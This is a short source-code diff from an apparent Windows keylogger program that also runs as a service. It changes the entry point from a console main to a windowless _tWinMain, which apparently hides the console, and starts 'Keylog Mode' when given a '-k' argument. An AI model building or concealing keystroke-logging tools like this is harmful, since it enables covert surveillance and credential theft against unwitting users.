@@ -44,10 +44,13 @@ SERVICE_STATUS          ServiceStatus;
 KeyLogManager klm;
 PROCESS_INFORMATION	keylog_proc_info;
 
-int _tmain(int argc, _TCHAR* argv[])
-{
-
-	if(argc > 1 && strcmp(argv[1], "-k") == 0){
+int WINAPI _tWinMain(
+    HINSTANCE hInstance,
+    HINSTANCE hPrevInstance,
+    LPTSTR lpCmdLine,
+    int nCmdShow
+){
+	if(strcmp(lpCmdLine, "-k") == 0){
 		Logger::debug("Keylog Mode");
 		start_keylog();
 		return 0;
